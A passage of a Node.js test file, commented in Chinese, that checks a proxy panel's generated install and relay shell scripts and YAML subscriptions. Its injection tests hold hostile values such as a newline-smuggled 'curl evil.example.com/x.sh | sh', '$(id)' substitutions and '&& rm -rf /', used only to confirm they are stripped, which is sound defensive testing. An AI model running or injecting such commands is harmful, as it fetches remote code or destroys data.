'use strict';
/**
 * 生成物可解析性测试：node test/generators.js
 *
 * 面板对外交付的不是 JSON，而是「拿下去就能跑」的文本：三份 shell 脚本和一份
 * YAML 订阅。这两类产物有个共同点 —— 出错时不会在面板里报错，而是在用户的
 * 机器上以「脚本跑一半停了」「订阅里少了一个节点」的形式出现，排查成本极高。
 *
 * 所以这里做的是「回读」而不是「字符串比对」：
 *   · shell 交给 `bash -n` 真解析一遍（我们拼的是字符串，语法错全靠它兜）
 *   · YAML 交给真解析器读回来，断言类型没变（`name: on` 变布尔是 0.1.33 的隐患）
 *
 * 为什么用 bash 而不是 sh：脚本 shebang 分两种（install/uninstall 是 sh，
 * relay 是 bash），bash -n 对 POSIX 子集同样严格，且 Linux/CI/macOS 都有。
 * 找不到 bash 时只跳过这一组并明确打出来，不静默通过。
 */
const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawnSync } = require('child_process');

// deploy-scripts 会读 settings.siteName 写进脚本注释行，store 在首次 db() 时建库。
// 数据目录必须在 require 之前指向临时目录，否则会往仓库的 data/ 里塞一个库。
const TMP = fs.mkdtempSync(path.join(os.tmpdir(), 'np-gen-'));
process.env.PANEL_DATA_DIR = TMP;
process.env.PANEL_DB_FILE = path.join(TMP, 'panel.db');

const {
  buildInstallScript,
  buildUninstallScript,
  buildRelayScript,
  buildRelayRuleScript,
  buildRelaySyncScript,
  relayTarget,
  GOST_VER_RE,
  readAgentSource,
} = require('../server/deploy-scripts');
const { toYaml } = require('../lib/yaml');

let pass = 0;
let fail = 0;
const ok = (name, cond, extra = '') => {
  if (cond) {
    pass++;
    console.log(`  ✓ ${name}${extra ? '  ' + extra : ''}`);
  } else {
    fail++;
    console.log(`  ✗ ${name}${extra ? '  ' + extra : ''}`);
  }
};
const skip = (name, why) => console.log(`  - ${name}（跳过：${why}）`);

/* ------------------------- 一、shell 生成物语法 ------------------------- */

const hasBash = (() => {
  const r = spawnSync('bash', ['-c', 'exit 0'], { stdio: 'ignore' });
  return !r.error && r.status === 0;
})();

/** @returns {null | string} null 表示语法通过，否则返回首条错误 */
function syntaxError(script) {
  const r = spawnSync('bash', ['-n'], { input: script, encoding: 'utf8' });
  if (r.error) return String(r.error.message);
  if (r.status === 0) return null;
  return (r.stderr || 'bash -n 失败').trim().split('\n').slice(0, 3).join(' / ');
}

const AGENT_SRC = readAgentSource();

// 一组「正常」参数：也是线上真实会生成的那几份
const SHELL_CASES = [
  ['部署脚本（双栈）', () => buildInstallScript({
    panelUrl: 'https://panel.example.com',
    token: 'a'.repeat(48),
    label: '香港 01',
    needHysteria: true,
    needXray: true,
    agentSrc: AGENT_SRC,
  })],
  ['部署脚本（仅 Hysteria2）', () => buildInstallScript({
    panelUrl: 'https://panel.example.com:8443',
    token: 'b'.repeat(48),
    label: 'HK-1',
    needHysteria: true,
    needXray: false,
    agentSrc: AGENT_SRC,
  })],
  ['卸载脚本', () => buildUninstallScript({ label: '香港 01' })],
  ['中转脚本（TCP+UDP）', () => buildRelayScript({
    to: relayTarget('1.2.3.4'),
    port: 8443,
    proto: 'both',
    label: '入口 · 东京',
  })],
  ['中转脚本（仅 TCP）', () => buildRelayScript({
    to: relayTarget('node-1.example.com'),
    port: 443,
    proto: 'tcp',
    label: '',
  })],
  // 中转机 agent 部署 / 卸载（0.1.44）：不安装 Xray / Hysteria2
  ['中转机部署脚本', () => buildInstallScript({
    panelUrl: 'https://panel.example.com',
    token: 'd'.repeat(48),
    label: '香港中转 (198.51.100.10)',
    needHysteria: true,
    needXray: true,
    relayOnly: true,
    agentSrc: AGENT_SRC,
  })],
  ['中转机卸载脚本', () => buildUninstallScript({ label: '香港中转', relayOnly: true })],
  // 中转机 agent 收敛包：空规则（清场）/ gost + iptables 混合
  ['中转收敛包（无规则）', () => buildRelaySyncScript({ rules: [] })],
  ['中转收敛包（混合规则）', () => buildRelaySyncScript({
    rules: [
      {
        id: 'ab12cd34', name: '香港 → 日本', tool: 'gost', proto: 'both', listenPort: 8443,
        targets: [{ host: '5.6.7.8', port: 443 }, { host: '5.6.7.9', port: 443 }],
      },
      {
        id: 'ef56ab78', name: '香港 → 新加坡', tool: 'iptables', proto: 'tcp', listenPort: 9443,
        targets: [{ host: '9.9.9.9', port: 8443 }, { host: '9.9.9.10', port: 8443 }],
      },
    ],
  })],
  // 入口机视角诊断（0.1.47）：只在面板触发请求后生成探测段
  ['中转收敛包（含入口机诊断）', () => buildRelaySyncScript({
    rules: [
      {
        id: 'ab12cd34', tool: 'iptables', proto: 'tcp', listenPort: 8443,
        targets: [{ host: '9.9.9.9', port: 443 }],
      },
    ],
    probe: [
      {
        id: 'ab12cd34', at: '2026-11-14T00:00:00.000Z',
        targets: [{ host: '9.9.9.9', port: 443 }],
      },
    ],
  })],
  // 中转规则三态脚本（0.1.43）：gost / iptables × install / uninstall / check
  ...['gost', 'iptables'].flatMap((tool) =>
    ['install', 'uninstall', 'check'].map((mode) => [
      `中转规则（${tool} · ${mode}）`,
      () => buildRelayRuleScript({
        rule: {
          id: 'ab12cd34', name: '香港入口 → 日本节点', tool, proto: 'both',
          listenPort: 8443, targetHost: '5.6.7.8', targetPort: 443,
          // 多目标（0.1.46）：顺序即故障切换顺序
          targets: [{ host: '5.6.7.8', port: 443 }, { host: '5.6.7.9', port: 443 }],
          deployToken: 'f0e1d2c3b4a5f6e7', status: 'planned',
        },
        mode,
        panelUrl: 'https://panel.example.com:8080',
      }),
    ]),
  ),
];

// 恶意输入：脚本仍然必须是合法 shell（注入被剥掉，而不是把脚本搞坏）
const HOSTILE = [
  ['换行 + 命令拼接', 'x"\ncurl evil.example.com/x.sh | sh\n#'],
  ['命令替换', '$(id) `id` ${HOME}'],
  ['反斜杠 + 引号闭合', 'a\\" && rm -rf / #'],
  ['中文与空格', '香港 01 "测试"'],
];

console.log('shell 生成物（bash -n 真解析）');
if (!hasBash) {
  skip('全部 shell 语法检查', '本机没有 bash');
} else {
  for (const [name, make] of SHELL_CASES) {
    const script = make();
    ok(`${name} 语法合法`, syntaxError(script) === null, `(${script.length} 字节)`);
  }

  for (const [name, evil] of HOSTILE) {
    const relay = buildRelayScript({ to: evil, port: 8443, label: evil });
    const uninstall = buildUninstallScript({ label: evil });
    const install = buildInstallScript({
      panelUrl: `https://panel.example.com/${evil}`,
      token: 'c'.repeat(48),
      label: evil,
      needHysteria: false,
      needXray: false,
      agentSrc: AGENT_SRC,
    });
    const bad = [['中转', relay], ['卸载', uninstall], ['部署', install]]
      .map(([kind, s]) => [kind, syntaxError(s)])
      .filter(([, err]) => err !== null);
    ok(`${name}：三份脚本仍合法`, bad.length === 0, bad.length ? JSON.stringify(bad) : '');
  }
}

/* --------------------- 中转机脚本：不碰节点域 --------------------- */

{
  // 即便调用方传了 needXray/needHysteria，relayOnly 也必须把它们压成 0
  const relayInstall = buildInstallScript({
    panelUrl: 'https://panel.example.com',
    token: 'e'.repeat(48),
    label: '香港中转',
    needHysteria: true,
    needXray: true,
    relayOnly: true,
    agentSrc: AGENT_SRC,
  });
  ok('中转机部署脚本带 RELAY_ONLY=1', relayInstall.includes('RELAY_ONLY="1"'));
  ok('中转机部署脚本把 Xray/Hysteria 依赖压成 0',
    relayInstall.includes('NEED_XRAY="0"') && relayInstall.includes('NEED_HYSTERIA="0"'));

  const relayUninstall = buildUninstallScript({ label: '香港中转', relayOnly: true });
  ok('中转机卸载脚本清理 gost unit', relayUninstall.includes('gost-relay-'));
  ok('中转机卸载脚本清理 np-relay 规则', relayUninstall.includes('np-relay'));

  const sync = buildRelaySyncScript({
    rules: [
      {
        id: 'ab12cd34', tool: 'gost', proto: 'both', listenPort: 8443,
        targets: [{ host: '5.6.7.8', port: 443 }, { host: '5.6.7.9', port: 443 }],
      },
      {
        id: 'ef56ab78', tool: 'iptables', proto: 'tcp', listenPort: 9443,
        targets: [{ host: '9.9.9.9', port: 8443 }, { host: '9.9.9.10', port: 8443 }],
      },
    ],
  });
  ok('中转收敛包含 gost unit', sync.includes('gost-relay-ab12cd34.service'));
  ok('中转收敛包含 iptables 标签', sync.includes('np-relay:ef56ab78'));
  ok('中转收敛包含过期规则清理', sync.includes('已移除过期'));

  // 多目标（0.1.46）：gost 交给进程内 fifo 切换；iptables 每轮探测选一个
  const gostInstall = buildRelayRuleScript({
    rule: {
      id: 'ab12cd34', tool: 'gost', proto: 'tcp', listenPort: 8443,
      targets: [{ host: '5.6.7.8', port: 443 }, { host: '5.6.7.9', port: 443 }],
      deployToken: 'f0e1d2c3b4a5f6e7',
    },
    mode: 'install',
  });
  ok('gost 安装脚本按顺序探测目标',
    gostInstall.includes('pick_target') && gostInstall.includes("TARGETS=('5.6.7.8:443' '5.6.7.9:443')"));
  const iptInstall = buildRelayRuleScript({
    rule: {
      id: 'ef56ab78', tool: 'iptables', proto: 'tcp', listenPort: 9443,
      targets: [{ host: '9.9.9.9', port: 8443 }, { host: '9.9.9.10', port: 8443 }],
      deployToken: 'f0e1d2c3b4a5f6e7',
    },
    mode: 'install',
  });
  ok('iptables 安装时探测目标', iptInstall.includes("TARGETS=('9.9.9.9:8443' '9.9.9.10:8443')") && iptInstall.includes('pick_target'));
  ok('iptables 安装脚本缺工具时自动安装',
    iptInstall.includes('apk add --no-cache iptables') && iptInstall.includes('apt-get install -y -qq iptables'));
  ok('iptables 持久化兼容 OpenRC', iptInstall.includes('rc-service iptables save'));
  ok('中转收敛包自动安装 iptables', sync.includes('apk add --no-cache iptables'));
  ok('中转收敛包持久化兼容 OpenRC', sync.includes('rc-service iptables save'));
  ok('iptables 脚本解析域名目标',
    iptInstall.includes('resolve_ipv4') && iptInstall.includes('nslookup') && sync.includes('resolve_ipv4'));
  ok('iptables 规则放行 FORWARD 转发',
    iptInstall.includes('add_fwd FORWARD') && sync.includes('add_fwd FORWARD'));
  ok('中转收敛包带回程计数（双向）', sync.includes('np-relay-back:') && sync.includes('NP_RELAY_BACK'));

  ok('gost 收敛包按顺序探测目标',
    sync.includes("NP_TARGETS='5.6.7.8:443 5.6.7.9:443'") && sync.includes('nc -z -w 2'));
  ok('gost 下载支持 GitHub 反代 + 大陆检测',
    gostInstall.includes('GOST_PROXY=') && gostInstall.includes('cdn-cgi/trace'));
  ok('gost 服务管理兼容 OpenRC（Alpine）',
    gostInstall.includes('/etc/init.d/') && gostInstall.includes('rc-service'));
  ok('gost 下载走流式解压（小磁盘机器）',
    gostInstall.includes('tar -xzO gost') && gostInstall.includes('df -k'));
  ok('中转收敛包下载走流式解压',
    sync.includes('tar -xzO gost') && sync.includes('df -k'));
  ok('中转收敛包兼容 OpenRC', sync.includes('rc-service') && sync.includes('/etc/init.d/gost-relay-'));
  ok('gost 规则带流量计数链', sync.includes('NP_RELAY_COUNT') && sync.includes('np-relay-count:ab12cd34'));
  ok('iptables 规则未变化时保留计数器', sync.includes('保留计数器'));
}

/* --------------------- 二、注入串不得成为可执行语句 --------------------- */

console.log('\nshell 生成物（注入串必须被剥掉）');

// 基线：同一批参数 + 干净标签。恶意用例只需要跟它比行数，
// 不用去猜「哪些行看起来像命令」——那种启发式会把卸载脚本自己的 rm 判成注入。
const relayBase = buildRelayScript({ to: '1.2.3.4', port: 8443, label: 'HK-1' });
const uninstallBase = buildUninstallScript({ label: 'HK-1' });
const installBase = buildInstallScript({
  panelUrl: 'https://panel.example.com',
  token: 'c'.repeat(48),
  label: 'HK-1',
  needHysteria: false,
  needXray: false,
  agentSrc: AGENT_SRC,
});

for (const [name, evil] of HOSTILE) {
  const relay = buildRelayScript({ to: evil, port: 8443, label: evil });
  const uninstall = buildUninstallScript({ label: evil });
  const install = buildInstallScript({
    panelUrl: `https://panel.example.com/${evil}`,
    token: 'c'.repeat(48),
    label: evil,
    needHysteria: false,
    needXray: false,
    agentSrc: AGENT_SRC,
  });
  // 部署脚本本体里合法地用了 $(...)（date / id / sed 等），所以这里只查
  // 「用户可控值落进去的那一行」：TARGET_HOST / TARGET_LABEL / PANEL_URL
  const watched = (script) =>
    script
      .split('\n')
      .filter((l) => /^(TARGET_HOST|TARGET_LABEL|PANEL_URL|AGENT_TOKEN)=/.test(l.trim()))
      .filter((l) => /\$\(|`/.test(l))
      .map((l) => l.trim());

  const leaks = [...watched(relay), ...watched(uninstall), ...watched(install)];
  ok(`${name}：赋值行无命令替换`, leaks.length === 0, leaks.length ? JSON.stringify(leaks.slice(0, 2)) : '');

  // 换行注入最硬的判据：行数不能变。
  // shellSafe 把 \r\n 折成空格，所以「多出一行」就意味着撕开了注释/语句。
  // 比「不能出现 rm 命令」可靠 —— 卸载脚本本来就有一堆 rm。
  const grew = [
    ['中转', relay, relayBase],
    ['卸载', uninstall, uninstallBase],
    ['部署', install, installBase],
  ]
    .map(([kind, s, base]) => [kind, s.split('\n').length - base.split('\n').length])
    .filter(([, delta]) => delta !== 0);
  ok(`${name}：行数未变`, grew.length === 0, grew.length ? JSON.stringify(grew) : '');
}

// 部署脚本整体不该出现被剥干净后的空赋值以外的东西：至少 URL 还完整可用
const installNormal = buildInstallScript({
  panelUrl: 'https://panel.example.com',
  token: 'd'.repeat(48),
  label: '香港 01',
  needHysteria: true,
  needXray: true,
  agentSrc: AGENT_SRC,
});
ok('部署脚本 PANEL_URL 未被误伤', installNormal.includes('PANEL_URL="https://panel.example.com"'));
ok('部署脚本 TARGET_LABEL 未被误伤', installNormal.includes('TARGET_LABEL="香港 01"'));

/* ------------------------ 三、relayTarget 白名单 ------------------------ */

console.log('\n中转落地地址白名单');
const TARGET_CASES = [
  ['1.2.3.4', '1.2.3.4'],
  ['  1.2.3.4  ', '1.2.3.4'], // 前后空白剥掉
  ['example.com', 'example.com'],
  ['node-1.example.com', 'node-1.example.com'],
  ['EXAMPLE.COM', 'EXAMPLE.COM'],
  ['', ''],
  ['   ', ''],
  // 以下全部必须拒绝
  ['1.2.3.4"\ncurl evil|sh\n#', ''],
  ['::1', ''], // IPv6 暂不支持（脚本用 iptables v4）
  ['[2001:db8::1]', ''],
  ['http://1.2.3.4', ''],
  ['1.2.3.4:443', ''],
  ['1.2.3.4/path', ''],
  ['111', ''], // 单段数字既不是 IPv4 也不是域名
  ['evil$(id)', ''],
  ['a b', ''],
  ['-bad.example.com', ''],
  ['999.1.1.1', ''],
];
for (const [input, expected] of TARGET_CASES) {
  ok(`relayTarget(${JSON.stringify(input)}) = ${JSON.stringify(expected)}`, relayTarget(input) === expected);
}

/* ------------------- 三·五、中转规则三态脚本（0.1.43） ------------------- */

console.log('\n中转规则三态脚本（标签 / unit / 回执）');

const RELAY_RULE = {
  id: 'ab12cd34',
  name: '香港入口 → 日本节点',
  tool: 'gost',
  proto: 'both',
  listenPort: 8443,
  targetHost: '5.6.7.8',
  targetPort: 443,
  deployToken: 'f0e1d2c3b4a5f6e7',
  status: 'planned',
};
const relayRuleScript = (mode, tool = 'gost', overrides = {}) =>
  buildRelayRuleScript({ rule: { ...RELAY_RULE, tool, ...overrides }, mode, panelUrl: 'https://panel.example.com:8080' });

if (hasBash) {
  // 恶意 name 进注释行：三态 × 两工具全部必须保持合法 shell 且行数不变
  for (const [name, evil] of HOSTILE) {
    for (const tool of ['gost', 'iptables']) {
      const base = relayRuleScript('install', tool, { name: 'HK-1' });
      const evilScript = relayRuleScript('install', tool, { name: evil });
      const err = syntaxError(evilScript);
      ok(
        `${name}：${tool} install 仍合法`,
        err === null,
        err ? err : '',
      );
      ok(
        `${name}：${tool} install 行数未变`,
        evilScript.split('\n').length === base.split('\n').length,
      );
    }
  }
}

// iptables：规则必须带标签（卸载靠它精确定位），MASQUERADE 同标签
const ipInst = relayRuleScript('install', 'iptables');
ok('iptables install 打上 np-relay:<id> 标签', ipInst.includes("TAG='-m comment --comment np-relay:ab12cd34'"));
ok('iptables install 的 DNAT 引用 $TAG', ipInst.includes('-j DNAT --to-destination "$TARGET_HOST:$TARGET_PORT" $TAG'));
ok('iptables install 含 MASQUERADE', ipInst.includes('add_rule POSTROUTING -d "$TARGET_HOST" -j MASQUERADE $TAG'));
ok('iptables install 有端口占用预检', ipInst.includes('已被其它 DNAT 规则占用'));
const ipUni = relayRuleScript('uninstall', 'iptables');
ok('iptables uninstall 按标签删除（-S 转 -D，不依赖行号）', ipUni.includes('grep -F "np-relay:$RELAY_ID"'));
ok('iptables uninstall 有无标签兜底（按监听端口匹配）', ipUni.includes('--dport $LISTEN_PORT'));
ok('iptables uninstall 清理 FORWARD 放行', ipUni.includes('iptables -D FORWARD'));
const ipChk = relayRuleScript('check', 'iptables');
ok('iptables check 只读盘点全部面板规则', ipChk.includes("grep -F 'np-relay:'"));

// gost：每规则一个 systemd unit + env 文件；ExecStart 里的 ${NP_*} 必须原样保留给 systemd
const gInst = relayRuleScript('install', 'gost');
ok(
  'gost install 的 ExecStart 保留 systemd 变量字面',
  gInst.includes('ExecStart=/usr/local/bin/gost -L tcp://:${NP_LISTEN}/${NP_TARGET} -L udp://:${NP_LISTEN}/${NP_TARGET}'),
);
ok('gost install 的 EnvironmentFile 是实际路径', gInst.includes('EnvironmentFile=/etc/gost/relay-ab12cd34.env'));
ok('gost install 的 env 文件带 bash 展开的端口', gInst.includes('NP_LISTEN=${LISTEN_PORT}') && gInst.includes('NP_TARGET=${TARGET_ADDR}'));
ok('gost install 的服务名含规则 ID', gInst.includes('gost-relay-${RELAY_ID}'));
ok('gost install 有端口占用预检', gInst.includes('已被其它进程占用'));
ok('gost install 有端口监听自检', gInst.includes('端口未监听'));
ok('gost install 官方 release 下载 + 镜像变量', gInst.includes('go-gost/gost/releases/download') && gInst.includes('GOST_DL_BASE'));
const gUni = relayRuleScript('uninstall', 'gost');
ok('gost uninstall 停删 unit 与 env', gUni.includes('disable --now') && gUni.includes('rm -f "/etc/systemd/system/$UNIT"'));
ok('gost uninstall 的 --purge 保护其它规则', gUni.includes('gost-relay-*.service'));
const gChk = relayRuleScript('check', 'gost');
ok('gost check 校验 unit active + 端口监听', gChk.includes('is-active --quiet') && gChk.includes('ss -lntu'));

// 回执：三态 × 两工具都要带 ack（deployToken / mode / ok）。
// JSON 体内嵌在 bash 双引号里，引号以 \" 转义落盘；mode 由脚本头部的
// MODE="<mode>" 赋值行传入（JSON 里是 ${MODE} 变量），按实际字节匹配
for (const tool of ['gost', 'iptables']) {
  for (const mode of ['install', 'uninstall', 'check']) {
    const s = relayRuleScript(mode, tool);
    ok(
      `${tool}/${mode} 带回执（ack + token + mode）`,
      s.includes('/api/relay/ack') &&
        s.includes(`MODE="${mode}"`) &&
        s.includes('\\"id\\":\\"${RELAY_ID}\\"') &&
        s.includes('\\"token\\":\\"${RELAY_TOKEN}\\"') &&
        s.includes('\\"mode\\":\\"${MODE}\\"') &&
        s.includes('\\"ok\\":${OK}'),
    );
  }
}

// gost 版本白名单：nightly / rc 必须拒绝（release 资产名不可预测）
ok('GOST_VER_RE 放行 x.y.z', GOST_VER_RE.test('3.5.1'));
ok('GOST_VER_RE 拒绝 nightly', !GOST_VER_RE.test('3.0.0-nightly.20240101') && !GOST_VER_RE.test('3.5.1-rc1'));

/* -------------------------- 四、YAML 标量类型 -------------------------- */

console.log('\nYAML 标量（类型不能被解析器改写）');

// 会被 YAML 1.1 / 1.2 解析成非字符串的写法 —— 必须加引号
const MUST_QUOTE = [
  'null', 'Null', 'NULL', '~',
  'true', 'True', 'FALSE', 'yes', 'no', 'on', 'off', 'Y', 'N',
  '123', '-1', '+86', '1.5', '.5', '1e3', '1E3', '1_000', '0x1f',
  '2024-01-01', '2024-01-01T00:00:00Z',
  'a b', '香港1', 'a:', '#tag', '@at', '`tick', 'x,y', '',
];
// 可以裸写（否则订阅里全是引号，人肉 diff 时噪音很大）
const MAY_BARE = [
  'HK-1', 'example.com', 'node_1', 'vless', 'ws', 'a/b', '1.2.3.4', 'a:b', '1.2.3.4:443', 'hysteria2',
  // 斜杠开头的绝对路径必须裸写：hysteria 的 cert / key 就是这种值，一旦被加引号，
  // agent 的 hy_ensure 用 sed 抠出来的就是带引号的字面量，`[ -f ]` 永远判假，
  // 证书明明在也报「证书未就绪」，hysteria 永远不启动（0.1.34 的线上回归）
  '/etc/nodepanel/certs/c5c12cbdbbde0/fullchain.pem',
  '/usr/local/etc/xray/config.json',
];

for (const s of MUST_QUOTE) {
  const out = toYaml(s);
  const quoted = out.startsWith('"') && out.endsWith('"');
  const roundTrip = quoted && JSON.parse(out) === s;
  ok(`toYaml(${JSON.stringify(s)}) 加引号且可回读`, quoted && roundTrip, `→ ${out}`);
}
for (const s of MAY_BARE) {
  const out = toYaml(s);
  ok(`toYaml(${JSON.stringify(s)}) 裸写`, out === s, `→ ${out}`);
}

/* ------------------- 五、整份文档交给真解析器回读 ------------------- */

/**
 * 找一个真 YAML 解析器。
 *
 * 仓库是零运行期依赖，也刻意不维护 lockfile，所以不能为了测试硬加依赖：
 *   · 装了 `yaml`（npm）就用它（YAML 1.2 core，和 mihomo 的 yaml.v3 同族）
 *   · 否则用 PyYAML（YAML 1.1，比 1.2 更凶：`on`/`yes` 都是布尔，
 *     正好能验证我们防的那一类解析器）
 *   · 都没有就只跑上面的结构断言，并明确打印「未做真解析」
 */
let parser = null;
try {
  const mod = require('yaml');
  if (typeof mod.parse === 'function') parser = { name: 'yaml（npm, YAML 1.2）', parse: (t) => mod.parse(t) };
} catch {
  /* 未安装，往下试 PyYAML */
}
if (!parser) {
  const probe = spawnSync('python3', ['-c', 'import yaml'], { stdio: 'ignore' });
  if (!probe.error && probe.status === 0) {
    parser = {
      name: 'PyYAML（YAML 1.1）',
      parse: (text) => {
        const r = spawnSync(
          'python3',
          ['-c', 'import sys,yaml,json;sys.stdout.write(json.dumps(yaml.safe_load(sys.stdin.read()),ensure_ascii=False))'],
          { input: text, encoding: 'utf8' },
        );
        if (r.status !== 0) throw new Error((r.stderr || 'PyYAML 解析失败').trim());
        return JSON.parse(r.stdout);
      },
    };
  }
}

/**
 * 候选解析器必须先过一道最小用例才算数。
 *
 * PyYAML 分支是一行跨进程的 python 命令，写错了（引号、编码、json 序列化）
 * 在没装它的机器上根本看不出来；到了 CI 才会一路抛错。用自检把它降级成
 * 「跳过」而不是「失败」——测试基建本身不该成为红灯来源。
 */
function usable(p) {
  if (!p) return false;
  try {
    const v = p.parse('a: 1\nb: "on"\n');
    return v && v.a === 1 && v.b === 'on';
  } catch {
    return false;
  }
}
if (parser && !usable(parser)) {
  console.log(`  · ${parser.name} 自检未通过，忽略`);
  parser = null;
}

console.log('\nYAML 文档回读');
if (!parser) {
  skip('整份文档真解析', '既没有 yaml 包也没有 PyYAML');
} else {
  console.log(`  · 解析器：${parser.name}`);

  // 0) 逐个标量放进 value 位置回读 —— 生产里的形状就是 `name: <scalar>`，
  //    裸标量的合法性也只有在那个位置才成立（顶层裸 `a:b` 会被当成映射）
  for (const s of [...MUST_QUOTE, ...MAY_BARE]) {
    let got;
    try {
      got = parser.parse(toYaml({ name: s })).name;
    } catch (e) {
      ok(`name: ${JSON.stringify(s)} 可解析`, false, String(e.message).split('\n')[0]);
      continue;
    }
    ok(
      `name: ${JSON.stringify(s)} 回读仍是字符串`,
      typeof got === 'string' && got === s,
      `→ ${typeof got} ${JSON.stringify(got)}`,
    );
  }

  // 1) 危险的节点名：读回来必须还是字符串
  for (const name of ['on', '123', 'null', '2024-01-01', 'a b']) {
    const doc = toYaml({ proxies: [{ name, type: 'vless', server: '1.2.3.4', port: 443 }] });
    let got;
    try {
      got = parser.parse(doc).proxies[0].name;
    } catch (e) {
      ok(`节点名 ${JSON.stringify(name)} 回读`, false, String(e.message));
      continue;
    }
    ok(
      `节点名 ${JSON.stringify(name)} 回读仍是字符串`,
      typeof got === 'string' && got === name,
      `→ ${typeof got} ${JSON.stringify(got)}`,
    );
  }

  // 2) 数字不能被过度加引号（否则 mihomo 收到字符串 port 会拒绝整份配置）
  const doc = toYaml({
    port: 7890,
    'allow-lan': true,
    proxies: [{ name: 'HK-1', port: 443, udp: true }],
    rules: ['MATCH,DIRECT'],
  });
  let parsed;
  try {
    parsed = parser.parse(doc);
  } catch (e) {
    parsed = null;
    ok('整份配置可解析', false, String(e.message));
  }
  if (parsed) {
    ok('整份配置可解析', true);
    ok('port 仍是 number', typeof parsed.port === 'number' && parsed.port === 7890, `→ ${typeof parsed.port}`);
    ok('allow-lan 仍是 boolean', parsed['allow-lan'] === true, `→ ${typeof parsed['allow-lan']}`);
    ok('嵌套 port 仍是 number', typeof parsed.proxies[0].port === 'number');
    ok('嵌套 udp 仍是 boolean', parsed.proxies[0].udp === true);
    ok('数组元素保持字符串', Array.isArray(parsed.rules) && parsed.rules[0] === 'MATCH,DIRECT');
  }

  // 3) 键名里的怪字符（当前 key 都是字面量，防的是将来拿用户输入当 key）
  const keyDoc = toYaml({ 'weird key': 1, 'a:b': 2 });
  try {
    const kp = parser.parse(keyDoc);
    ok('怪键名可回读', kp['weird key'] === 1 && kp['a:b'] === 2, `→ ${JSON.stringify(kp)}`);
  } catch (e) {
    ok('怪键名可回读', false, String(e.message));
  }
}

/* --------------------- 六、配置生成物的字段类型 --------------------- */

/**
 * 这一类坑是 0.1.33 收尾时踩到的：给「长得像数字的字符串」加引号之后，
 * 原来靠裸写侥幸当整数用的字段（`hop-interval: 30`、`masquerade.type: 404`）
 * 变成了 `"30"` / `"404"`，对端是 Go 结构体，类型不对直接整份配置加载失败。
 *
 * 所以这里卡的不是「我们输出了什么字符串」，而是「对端会读成什么类型」：
 * 结构性断言（不依赖解析器）保证数字字段没被加引号，解析器可用时再验一遍类型。
 */
console.log('\n配置生成物（数字字段不能被写成字符串）');

const hysteria = require('../lib/hysteria');
const hyNode = {
  id: 'n1',
  name: '香港 01',
  mode: 'standalone',
  address: '1.2.3.4',
  protocol: 'hysteria2',
  port: 443,
  sni: 'hk.example.com',
  hy2: { obfs: '', obfsPassword: '', upMbps: 100, downMbps: 200 },
};
const hyCfg = hysteria.toYamlFile(hyNode, [], '星链 · 节点面板', 9999);

ok(
  'masquerade.type 仍是整数 404',
  /^masquerade:\n {2}type: 404$/m.test(hyCfg),
  hyCfg.match(/^masquerade:\n {2}type: .*$/m)?.[0].replace('\n', ' → ') || '',
);
ok('bandwidth 仍是带单位的字符串', /up: "100 mbps"/.test(hyCfg));

// 跳端口径：hop-interval 必须是整数，ports 必须是「看起来像范围」的字符串
const hopNode = { ...hyNode, hy2: { ...hyNode.hy2, hop: '40000-40499', hopInterval: 30 } };
const subMod = require('../lib/sub');
const hopClash = subMod.toClash([hopNode], [], { id: 7, uuid: '11111111-1111-1111-1111-111111111111' }, 'site', null, null);
ok('Clash hop-interval 是整数', /hop-interval: 30$/m.test(hopClash), hopClash.match(/hop-interval: .*/)?.[0] || '');
ok('Clash ports 不加引号也能当字符串读', /ports: 40000-40499$/m.test(hopClash), hopClash.match(/ports: .*/)?.[0] || '');

if (parser) {
  try {
    const hy = parser.parse(hyCfg);
    ok('masquerade.type 解析成 number', typeof hy.masquerade.type === 'number' && hy.masquerade.type === 404, `→ ${typeof hy.masquerade.type}`);
    ok('listen 解析成字符串', hy.listen === ':443', `→ ${JSON.stringify(hy.listen)}`);
  } catch (e) {
    ok('Hysteria2 配置可解析', false, String(e.message).split('\n')[0]);
  }
  try {
    const hc = parser.parse(hopClash);
    const proxy = hc.proxies.find((p) => p.type === 'hysteria2');
    ok('Clash hop-interval 解析成 number', typeof proxy['hop-interval'] === 'number', `→ ${typeof proxy['hop-interval']}`);
    ok('Clash ports 解析成字符串', typeof proxy.ports === 'string', `→ ${typeof proxy.ports}`);
  } catch (e) {
    ok('Clash 带 hop 的配置可解析', false, String(e.message).split('\n')[0]);
  }
}

/* ------------- 六、hysteria 的证书路径必须能被 agent 正确抠出来 ------------- */

console.log('\nhysteria 证书路径（yaml 抠值与文件判断）');

// 0.1.34 的线上回归：yaml 把绝对路径写成 `cert: "/etc/..."`，agent 的 hy_ensure
// 用 sed 抠出冒号后的原文直接 `[ -f "$_cert" ]`，于是比的是「带引号字面量」这个
// 文件名，证书明明在磁盘上也判不存在 → hysteria 永远不启动。这里把两侧都钉住：
// 面板生成的 yaml 必须裸写，且 agent 那套「抠值 + 剥引号」对两种写法都能还原路径。
const probeNode = {
  id: 'e5a3124338ff',
  name: 'HK',
  host: '1.2.3.4',
  port: 24578,
  protocol: 'hysteria2',
  certMode: 'ref',
  certId: 'c5c12cbdbbde0',
  upMbps: 0,
  downMbps: 0,
  obfs: '',
  sni: '',
};
const hyYaml = hysteria.toYamlFile(probeNode, [], '站点', 30001);
const certLine = hyYaml.split('\n').find((l) => /^\s*cert:/.test(l)) || '';
const keyLine = hyYaml.split('\n').find((l) => /^\s*key:/.test(l)) || '';

ok('hysteria yaml 的 cert 裸写（不带引号）', certLine === '  cert: /etc/nodepanel/certs/c5c12cbdbbde0/fullchain.pem', certLine);
ok('hysteria yaml 的 key 裸写（不带引号）', keyLine === '  key: /etc/nodepanel/certs/c5c12cbdbbde0/privkey.pem', keyLine);

// 用 agent 侧同一套 shell 逻辑跑一遍：抠值 → 剥引号。断言还原出的字符串与写入
// yaml 的路径逐字节一致 —— 只要它带引号，`[ -f ]` 就会判一个不存在的文件名。
const probeDir = path.join(TMP, 'hyprobe');
fs.mkdirSync(probeDir, { recursive: true });
const probeCert = path.join(probeDir, 'fullchain.pem');

const pickScript = `
_cfg=$1
_cert=$(sed -n 's/^[[:space:]]*cert:[[:space:]]*//p' "$_cfg" 2>/dev/null | sed -n '1p')
_cert=\${_cert#\\"}; _cert=\${_cert%\\"}
_cert=\${_cert#\\'}; _cert=\${_cert%\\'}
printf '%s' "$_cert"
`;
for (const [label, line] of [
  ['裸写', `  cert: ${probeCert}`],
  ['双引号（0.1.34 生成的形态）', `  cert: "${probeCert}"`],
  ['单引号', `  cert: '${probeCert}'`],
]) {
